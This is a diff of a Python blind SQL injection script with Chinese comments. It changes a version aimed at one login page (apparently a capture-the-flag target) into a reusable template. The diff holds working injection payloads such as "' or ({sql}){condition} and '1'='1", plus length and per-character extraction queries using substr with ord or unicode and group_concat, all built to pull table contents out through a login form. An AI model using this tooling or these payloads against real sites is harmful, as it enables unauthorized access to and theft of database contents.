@@ -2,24 +2,28 @@
 
 import requests
 from argparse import ArgumentParser
-url= 'http://111.198.29.45:32197/login.php'
+#url,必须修改
+url= ''
 ss = requests.session()
 
-raw_payload="usr=hi' or (({sql}){condition} and 1) --&pw=1"
+#核心判断字段语句,必须修改。真则正确，假则错误
+##eg.raw_payload="{id}=' or ({sql}){condition} and '1'='1"
+raw_payload="{id}=' or ({sql}){condition} and '1'='1"
+#判断长度,一般不会改变
+##eg.
 length_sql = "select length(group_concat({field})) from {table} where {where}"
-#sqlite中没有ord,只有unicode
-field__sql = "select unicode(substr(group_concat({field}),{index},1)) from {table} where {where}"
+
+#猜表语句,sqliet用unicode,mysql用ord
+#field__sql = "select unicode(substr(group_concat({field}),{index},1)) from {table} where {where}"
+field__sql = "select ord(substr(group_concat({field}),{index},1)) from {table} where {where}"
+
+
+#核心函数，必须修改，判断正确与否
 def post(sql,condition,isPrint=True):
-    headers={"Content-Type":"application/x-www-form-urlencoded"}
     payload = raw_payload.format(sql=sql,condition=condition)
-    res = ss.post(url,data=payload,headers=headers)
     if isPrint:
         print("payload:%s"%payload)
-        #print(res.headers)
-    if 'Set-Cookie' in res.headers.keys():
-        return True
-    else:
-        return False
+    return False
 
 def binary_search_length(field, table, where):
     print('查询表: %s 中字段: %s 值的总长度' % (table, field))
